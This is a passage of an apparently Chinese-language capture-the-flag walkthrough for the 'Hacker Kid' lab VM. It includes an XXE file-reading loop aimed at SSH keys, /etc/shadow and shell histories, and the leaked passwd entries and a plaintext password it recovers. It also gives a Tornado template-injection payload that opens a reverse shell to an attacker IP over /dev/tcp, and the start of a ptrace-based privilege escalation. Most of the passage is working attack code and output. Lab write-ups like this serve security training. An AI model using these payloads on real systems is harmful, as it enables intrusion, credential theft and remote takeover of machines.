class="line">/etc/ssh/ssh_config</span><br><span class="line">/etc/ssh/ssh_host_dsa_key</span><br><span class="line">/etc/ssh/ssh_host_dsa_key</span><br><span class="line">/etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">/etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">/etc/ssh/ssh_host_key</span><br><span class="line">/etc/ssh/ssh_host_key</span><br><span class="line">/etc/ssh/ssh_host_key.pub</span><br><span class="line">/etc/ssh/ssh_host_key.pub</span><br><span class="line">/etc/ssh/ssh_host_rsa_key</span><br><span class="line">/etc/ssh/ssh_host_rsa_key</span><br><span class="line">/etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">/etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">/etc/sysconfig/network</span><br><span class="line">/etc/sysconfig/network</span><br><span class="line">/home/apache/conf/httpd.conf</span><br><span class="line">/home/apache2/conf/httpd.conf</span><br><span class="line">/home/bin/stable/apache/php.ini</span><br><span class="line">/home2/bin/stable/apache/php.ini</span><br><span class="line">/NetServer/bin/stable/apache/php.ini</span><br><span class="line">/opt/www/conf/httpd.conf</span><br><span class="line">/opt/www/htdocs/index.html</span><br><span class="line">/opt/www/htdocs/index.php</span><br><span class="line">/opt/xampp/etc/php.ini</span><br><span class="line">/PHP/php.ini</span><br><span class="line">/php/php.ini</span><br><span class="line">/php4/php.ini</span><br><span class="line">/php5/php.ini</span><br><span class="line">/tmp/apache/htdocs/index.html</span><br><span class="line">/tmp/apache/htdocs/index.php</span><br><span class="line">/usr/lib/php.ini</span><br><span class="line">/usr/lib/php/php.ini</span><br><span class="line">/usr/share/tomcat6/bin/startup.sh</span><br><span class="line">/usr/tomcat6/bin/startup.sh</span><br><span class="line">/var/apache2/config.inc</span><br><span class="line">/var/httpd/conf/httpd.conf</span><br><span class="line">/var/httpd/conf/php.ini</span><br><span class="line">/var/httpd/conf/php.ini</span><br><span class="line">/var/httpd/htdocs/index.html</span><br><span class="line">/var/httpd/htdocs/index.php</span><br><span class="line">/var/lib/mysql/my.cnf</span><br><span class="line">/var/lib/mysql/mysql/user.MYD</span><br><span class="line">/var/local/www/conf/httpd.conf</span><br><span class="line">/var/local/www/conf/php.ini</span><br><span class="line">/var/log/access.log</span><br><span class="line">/var/log/access_log</span><br><span class="line">/var/log/apache/access.log</span><br><span class="line">/var/log/apache/access_log</span><br><span class="line">/var/log/apache/error.log</span><br><span class="line">/var/log/apache/error_log</span><br><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/log/apache2/access_log</span><br><span class="line">/var/log/apache2/error.log</span><br><span class="line">/var/log/apache2/error_log</span><br><span class="line">/var/log/error.log</span><br><span class="line">/var/log/error_log</span><br><span class="line">/var/log/mysql.log</span><br><span class="line">/var/log/mysql/mysql-bin.log</span><br><span class="line">/var/log/mysql/mysql-slow.log</span><br><span class="line">/var/log/mysql/mysql.log</span><br><span class="line">/var/log/mysqlderror.log</span><br><span class="line">/var/mail/root</span><br><span class="line">/var/mysql.log</span><br><span class="line">/var/spool/cron/crontabs/root</span><br><span class="line">/var/spool/mail/root</span><br><span class="line">/var/www/conf/httpd.conf</span><br><span class="line">/var/www/htdocs/index.html</span><br><span class="line">/var/www/htdocs/index.php</span><br><span class="line">/var/www/index.html</span><br><span class="line">/var/www/index.php</span><br><span class="line">/var/www/logs/access.log</span><br><span class="line">/var/www/logs/access_log</span><br><span class="line">/var/www/logs/error.log</span><br><span class="line">/var/www/logs/error_log</span><br><span class="line">/web/conf/php.ini</span><br><span class="line">/www/conf/httpd.conf</span><br><span class="line">/www/htdocs/index.html</span><br><span class="line">/www/htdocs/index.php</span><br><span class="line">/www/php/php.ini</span><br><span class="line">/www/php4/php.ini</span><br><span class="line">/www/php5/php.ini</span><br><span class="line">/xampp/apache/bin/php.ini</span><br><span class="line">/xampp/apache/conf/httpd.conf</span><br><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/identity</span><br><span class="line">/root/.ssh/identity.pub</span><br><span class="line">/root/.ssh/id_dsa</span><br><span class="line">/root/.ssh/id_dsa.pub</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_rsa.pub</span><br><span class="line">/root/.atftp_history</span><br><span class="line">/root/.bashrc</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.mysql_history</span><br><span class="line">/root/.nano_history</span><br><span class="line">/root/.php_history</span><br><span class="line">/root/.profile</span><br><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/identity</span><br><span class="line">/root/.ssh/identity.pub</span><br><span class="line">/root/.ssh/id_dsa</span><br><span class="line">/root/.ssh/id_dsa.pub</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_rsa.pub</span><br><span class="line">/root/anaconda-ks.cfg</span><br><span class="line">/home/*/.ssh/authorized_keys</span><br><span class="line">/home/*/.ssh/identity</span><br><span class="line">/home/*/.ssh/identity.pub</span><br><span class="line">/home/*/.ssh/id_dsa</span><br><span class="line">/home/*/.ssh/id_dsa.pub</span><br><span class="line">/home/*/.ssh/id_rsa</span><br><span class="line">/home/*/.ssh/id_rsa.pub</span><br><span class="line">/home/*/.atftp_history</span><br><span class="line">/home/*/.bashrc</span><br><span class="line">/home/*/.bash_history</span><br><span class="line">/home/*/.mysql_history</span><br><span class="line">/home/*/.nano_history</span><br><span class="line">/home/*/.php_history</span><br><span class="line">/home/*/.profile</span><br><span class="line">/home/*/.ssh/authorized_keys</span><br><span class="line">/home/*/.ssh/identity</span><br><span class="line">/home/*/.ssh/identity.pub</span><br><span class="line">/home/*/.ssh/id_dsa</span><br><span class="line">/home/*/.ssh/id_dsa.pub</span><br><span class="line">/home/*/.ssh/id_rsa</span><br><span class="line">/home/*/.ssh/id_rsa.pub</span><br><span class="line">/home/*/anaconda-ks.cfg</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&#x27; &gt; ./test;</span><br><span class="line">for i in $(cat ./file0.txt)</span><br><span class="line">do</span><br><span class="line">str=`echo &#x27;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE drug [&lt;!ENTITY k SYSTEM &quot;php://filter/convert.base64-encode/resource=&#x27;$i&#x27;&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;1&lt;/name&gt;</span><br><span class="line">    &lt;tel&gt;1&lt;/tel&gt;</span><br><span class="line">    &lt;email&gt;&amp;k;&lt;/email&gt;</span><br><span class="line">    &lt;password&gt;1&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;&#x27; \</span><br><span class="line">| curl http://192.168.56.108/process.php \</span><br><span class="line">-H &#x27;Host: hackerkid.blackhat.local&#x27; \</span><br><span class="line">-d @- 2&gt;/dev/null`;</span><br><span class="line"> </span><br><span class="line">    if (($&#123;#$&#123;str: 7:(($&#123;#str&#125;-28))&#125;&#125;!=0)); then</span><br><span class="line">        echo &#x27;\n#&#x27;$i&#x27;###:&#x27; &gt;&gt; ./test;</span><br><span class="line">        echo $&#123;str: 7:(($&#123;#str&#125;-28))&#125; | base64 -d -i | grep -E &quot;(username|root|saket|admin|password|passwd)&quot; &gt;&gt; ./test;</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line">grep -E &quot;(username|root|saket|admin|password|passwd)&quot; ./test;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line">/apache/apache/conf/httpd.conf</span><br><span class="line">/apache/apache2/conf/httpd.conf</span><br><span class="line">/apache/php/php.ini</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/etc/apache/apache.conf</span><br><span class="line">/etc/apache/httpd.conf</span><br><span class="line">/etc/apache2/apache.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br><span class="line">/etc/apache2/sites-available/default</span><br><span class="line">/etc/apache2/vhosts.d/00_default_vhost.conf</span><br><span class="line">/etc/at.allow</span><br><span class="line">/etc/at.deny</span><br><span class="line">/etc/cron.allow</span><br><span class="line">/etc/cron.deny</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/fstab</span><br><span class="line">/etc/host.conf</span><br><span class="line">/etc/httpd/conf.d/httpd.conf</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/httpd/htdocs/index.html</span><br><span class="line">/etc/httpd/htdocs/index.php</span><br><span class="line">/etc/httpd/logs/access.log</span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/etc/httpd/logs/error.log</span><br><span class="line">/etc/httpd/logs/error_log</span><br><span class="line">/etc/httpd/php.ini</span><br><span class="line">/etc/init.d/httpd</span><br><span class="line">/etc/init.d/mysql</span><br><span class="line">/etc/ld.so.conf</span><br><span class="line">/etc/motd</span><br><span class="line">/etc/my.cnf</span><br><span class="line">/etc/mysql/my.cnf</span><br><span class="line">/etc/mysql/my.cnf</span><br><span class="line">/etc/network/interfaces</span><br><span class="line">/etc/networks</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/php.ini</span><br><span class="line">/etc/php/apache/php.ini</span><br><span class="line">/etc/php/apache2/php.ini</span><br><span class="line">/etc/php/cgi/php.ini</span><br><span class="line">/etc/php/php.ini</span><br><span class="line">/etc/php/php4/php.ini</span><br><span class="line">/etc/php4.4/fcgi/php.ini</span><br><span class="line">/etc/php4/apache/php.ini</span><br><span class="line">/etc/php4/apache2/php.ini</span><br><span class="line">/etc/php4/cgi/php.ini</span><br><span class="line">/etc/php5/apache/php.ini</span><br><span class="line">/etc/php5/apache2/php.ini</span><br><span class="line">/etc/php5/cgi/php.ini</span><br><span class="line">/etc/phpmyadmin/config.inc.php</span><br><span class="line">/etc/resolv.conf</span><br><span class="line">/etc/shadow</span><br><span class="line">/etc/ssh/sshd_config</span><br><span class="line">/etc/ssh/ssh_config</span><br><span class="line">/etc/ssh/ssh_host_dsa_key</span><br><span class="line">/etc/ssh/ssh_host_dsa_key</span><br><span class="line">/etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">/etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">/etc/ssh/ssh_host_key</span><br><span class="line">/etc/ssh/ssh_host_key</span><br><span class="line">/etc/ssh/ssh_host_key.pub</span><br><span class="line">/etc/ssh/ssh_host_key.pub</span><br><span class="line">/etc/ssh/ssh_host_rsa_key</span><br><span class="line">/etc/ssh/ssh_host_rsa_key</span><br><span class="line">/etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">/etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">/etc/sysconfig/network</span><br><span class="line">/etc/sysconfig/network</span><br><span class="line">/home/apache/conf/httpd.conf</span><br><span class="line">/home/apache2/conf/httpd.conf</span><br><span class="line">/home/bin/stable/apache/php.ini</span><br><span class="line">/home2/bin/stable/apache/php.ini</span><br><span class="line">/NetServer/bin/stable/apache/php.ini</span><br><span class="line">/opt/www/conf/httpd.conf</span><br><span class="line">/opt/www/htdocs/index.html</span><br><span class="line">/opt/www/htdocs/index.php</span><br><span class="line">/opt/xampp/etc/php.ini</span><br><span class="line">/PHP/php.ini</span><br><span class="line">/php/php.ini</span><br><span class="line">/php4/php.ini</span><br><span class="line">/php5/php.ini</span><br><span class="line">/tmp/apache/htdocs/index.html</span><br><span class="line">/tmp/apache/htdocs/index.php</span><br><span class="line">/usr/lib/php.ini</span><br><span class="line">/usr/lib/php/php.ini</span><br><span class="line">/usr/share/tomcat6/bin/startup.sh</span><br><span class="line">/usr/tomcat6/bin/startup.sh</span><br><span class="line">/var/apache2/config.inc</span><br><span class="line">/var/httpd/conf/httpd.conf</span><br><span class="line">/var/httpd/conf/php.ini</span><br><span class="line">/var/httpd/conf/php.ini</span><br><span class="line">/var/httpd/htdocs/index.html</span><br><span class="line">/var/httpd/htdocs/index.php</span><br><span class="line">/var/lib/mysql/my.cnf</span><br><span class="line">/var/lib/mysql/mysql/user.MYD</span><br><span class="line">/var/local/www/conf/httpd.conf</span><br><span class="line">/var/local/www/conf/php.ini</span><br><span class="line">/var/log/access.log</span><br><span class="line">/var/log/access_log</span><br><span class="line">/var/log/apache/access.log</span><br><span class="line">/var/log/apache/access_log</span><br><span class="line">/var/log/apache/error.log</span><br><span class="line">/var/log/apache/error_log</span><br><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/log/apache2/access_log</span><br><span class="line">/var/log/apache2/error.log</span><br><span class="line">/var/log/apache2/error_log</span><br><span class="line">/var/log/error.log</span><br><span class="line">/var/log/error_log</span><br><span class="line">/var/log/mysql.log</span><br><span class="line">/var/log/mysql/mysql-bin.log</span><br><span class="line">/var/log/mysql/mysql-slow.log</span><br><span class="line">/var/log/mysql/mysql.log</span><br><span class="line">/var/log/mysqlderror.log</span><br><span class="line">/var/mail/root</span><br><span class="line">/var/mysql.log</span><br><span class="line">/var/spool/cron/crontabs/root</span><br><span class="line">/var/spool/mail/root</span><br><span class="line">/var/www/conf/httpd.conf</span><br><span class="line">/var/www/htdocs/index.html</span><br><span class="line">/var/www/htdocs/index.php</span><br><span class="line">/var/www/index.html</span><br><span class="line">/var/www/index.php</span><br><span class="line">/var/www/logs/access.log</span><br><span class="line">/var/www/logs/access_log</span><br><span class="line">/var/www/logs/error.log</span><br><span class="line">/var/www/logs/error_log</span><br><span class="line">/web/conf/php.ini</span><br><span class="line">/www/conf/httpd.conf</span><br><span class="line">/www/htdocs/index.html</span><br><span class="line">/www/htdocs/index.php</span><br><span class="line">/www/php/php.ini</span><br><span class="line">/www/php4/php.ini</span><br><span class="line">/www/php5/php.ini</span><br><span class="line">/xampp/apache/bin/php.ini</span><br><span class="line">/xampp/apache/conf/httpd.conf</span><br><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/identity</span><br><span class="line">/root/.ssh/identity.pub</span><br><span class="line">/root/.ssh/id_dsa</span><br><span class="line">/root/.ssh/id_dsa.pub</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_rsa.pub</span><br><span class="line">/root/.atftp_history</span><br><span class="line">/root/.bashrc</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.mysql_history</span><br><span class="line">/root/.nano_history</span><br><span class="line">/root/.php_history</span><br><span class="line">/root/.profile</span><br><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/identity</span><br><span class="line">/root/.ssh/identity.pub</span><br><span class="line">/root/.ssh/id_dsa</span><br><span class="line">/root/.ssh/id_dsa.pub</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_rsa.pub</span><br><span class="line">/root/anaconda-ks.cfg</span><br><span class="line">/home/saket/.ssh/authorized_keys</span><br><span class="line">/home/saket/.ssh/identity</span><br><span class="line">/home/saket/.ssh/identity.pub</span><br><span class="line">/home/saket/.ssh/id_dsa</span><br><span class="line">/home/saket/.ssh/id_dsa.pub</span><br><span class="line">/home/saket/.ssh/id_rsa</span><br><span class="line">/home/saket/.ssh/id_rsa.pub</span><br><span class="line">/home/saket/.atftp_history</span><br><span class="line">/home/saket/.bashrc</span><br><span class="line">/home/saket/.bash_history</span><br><span class="line">/home/saket/.mysql_history</span><br><span class="line">/home/saket/.nano_history</span><br><span class="line">/home/saket/.php_history</span><br><span class="line">/home/saket/.profile</span><br><span class="line">/home/saket/.ssh/authorized_keys</span><br><span class="line">/home/saket/.ssh/identity</span><br><span class="line">/home/saket/.ssh/identity.pub</span><br><span class="line">/home/saket/.ssh/id_dsa</span><br><span class="line">/home/saket/.ssh/id_dsa.pub</span><br><span class="line">/home/saket/.ssh/id_rsa</span><br><span class="line">/home/saket/.ssh/id_rsa.pub</span><br><span class="line">/home/saket/anaconda-ks.cfg</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">HOME=/root</span><br><span class="line">LOGNAME=root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">and files <span class="keyword">in</span> /etc/cron.d. These files also have username fields,</span></span><br><span class="line">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">It has been reported that passwords should be enclosed with ticks/quotes</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">It has been reported that passwords should be enclosed with ticks/quotes</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/etc/passwd<span class="comment">###:</span></span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin</span><br><span class="line">saket:x:1000:1000:Ubuntu,,,:/home/saket:/bin/bash</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/home/saket/.bashrc<span class="comment">###:</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">set</span> variable identifying the <span class="built_in">chroot</span> you work <span class="keyword">in</span> (used <span class="keyword">in</span> the prompt below)</span></span><br><span class="line">if [ -z &quot;$&#123;debian_chroot:-&#125;&quot; ] &amp;&amp; [ -r /etc/debian_chroot ]; then</span><br><span class="line">    debian_chroot=$(cat /etc/debian_chroot)</span><br><span class="line">    PS1=&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#x27;</span><br><span class="line">    PS1=&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ &#x27;</span><br><span class="line">    PS1=&quot;\[\e]0;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h: \w\a\]$PS1&quot;</span><br><span class="line">username=&quot;admin&quot;</span><br><span class="line">password=&quot;Saket!#$%@!!&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/home/saket/.profile<span class="comment">###:</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>尝试访问 <code>http://192.168.56.118:9999/</code> 使用密码账号尝试</p>
<ul>
<li>尝试结果 username 是 saket</li>
<li>尝试结果 password 是 Saket!#$%@!!</li>
</ul>
<p><img src="/../images/30-pennnnnnnnnnntest/image-20230721174809705.png" alt="image-20230721174809705"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.108:9999/?name=&#123;&#123;1*1&#125;&#125;,$&#123;1*1&#125;,&lt;%1*1%&gt;,[1*1]</span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230721174852790.png" alt="image-20230721174852790"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% import os%&#125;&#123;&#123;os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.102/7779 0&gt;&amp;1&quot;&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7B%25%20import%20os%20%25%7D%7B%7Bos.system(%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.102%2F7779%200%3E%261%22%27)%7D%7D</span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230721175341346.png" alt="image-20230721175341346"></p>
<p>查看漏洞可能存在的权限漏洞使用 <code>/sbin/getcap -r / 2&gt;/dev/null</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">saket@ubuntu:/$ /sbin/getcap -r / 2&gt;/dev/null</span><br><span class="line">/sbin/getcap -r / 2&gt;/dev/null</span><br><span class="line">/usr/bin/python2.7 = cap_sys_ptrace+ep</span><br><span class="line">/usr/bin/traceroute6.iputils = cap_net_raw+ep</span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br><span class="line">/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep</span><br><span class="line">/usr/bin/mtr-packet = cap_net_raw+ep</span><br><span class="line">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span><br></pre></td></tr></table></figure>

<ul>
<li>其中 <code>/usr/bin/python2.7</code> 权限设置是有问题的</li>
<li>使用 <code>ps -aef | grep &#39;/usr/sbin/apache2 -k start&#39;</code> 查看与进程 <code>/usr/sbin/apache2 -k start</code> 相关的进程号，选和 <code>root</code> 相关的</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">saket@ubuntu:/$ ps -aef | grep &#x27;/usr/sbin/apache2 -k start&#x27; </span><br><span class="line">ps -aef | grep &#x27;/usr/sbin/apache2 -k start&#x27; </span><br><span class="line">root         859       1  0 07:25 ?        00:00:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data     860     859  0 07:25 ?        00:00:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data     870     859  0 07:25 ?        00:00:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data     871     859  0 07:25 ?        00:00:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data     872     859  0 07:25 ?        00:00:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data     873     859  0 07:25 ?        00:00:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data     874     859  0 07:25 ?        00:00:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data    1292     859  0 07:26 ?        00:00:00 /usr/sbin/apache2 -k start</span><br><span class="line">saket       2182    2158  0 10:56 ?        00:00:00 grep --color=auto /usr/sbin/apache2 -k start</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用漏洞攻击 <code>python2.7 inject.py 888</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 